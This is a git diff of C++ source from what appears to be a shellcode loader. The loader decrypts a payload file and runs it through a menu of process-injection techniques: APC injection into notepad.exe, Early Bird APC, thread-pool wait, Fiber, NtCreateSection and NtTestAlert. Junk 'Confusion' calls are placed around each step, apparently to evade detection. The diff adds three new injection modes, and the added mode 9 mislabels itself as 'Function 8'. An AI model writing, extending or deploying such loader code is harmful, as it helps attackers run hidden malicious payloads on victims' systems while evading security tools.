@@ -9,7 +9,6 @@
 #include "Launch.h"
 
 
-
 void Launch::au9u5tDecrypt() {
     std::ifstream inputFile{this->filePath, std::ios::binary};
     if (!inputFile) {
@@ -119,31 +118,50 @@ void Launch::launchFunction(std::string function_mode, const unsigned char *decr
         this->printMode("Function 2");
         this->startBase(MasterEncoderForApcLoader::function1, decryptedData, byteLength, "notepad.exe");
         Confusion::generateAndSortArray();
-        while (true){
+        while (true) {
 
         }
-    }else if (function_mode == "3") {
+    } else if (function_mode == "3") {
         Confusion::generateAndSortArray();
         this->printMode("Function 3");
         this->startBase(MasterEncoderForCreateThreatPoolWaitLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode == "4") {
+    } else if (function_mode == "4") {
         Confusion::generateAndSortArray();
         this->printMode("Function 4");
         this->startBase(MasterEncoderForDynamicLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode == "5") {
+    } else if (function_mode == "5") {
         Confusion::generateAndSortArray();
         this->printMode("Function 5");
         this->startBase(MasterEncoderForDynamicLoadPlus::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else if (function_mode == "6") {
+    } else if (function_mode == "6") {
         Confusion::generateAndSortArray();
         this->printMode("Function 6");
-        this->startBase( MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
+        this->startBase(MasterEncoderForEarlyBirdAPC_InjetcLoad::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-    }else {
-        std::cout << "Invalid function mode!" << std::endl;
+    } else if (function_mode == "7") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 7");
+        this->startBase(MasterEncoderForFiberLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    } else if (function_mode == "8") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 8");
+        this->startBase(MasterEncoderForNtCreateSectionLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+        while (true) {
+
+        }
+    } else if (function_mode == "9") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 8");
+        this->startBase(MasterEncoderForNtTestAlertLoad::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
+    } else {
+        std::cout << "Invalid function mode!" <<
+                  std::endl;
         return;
     }
 }
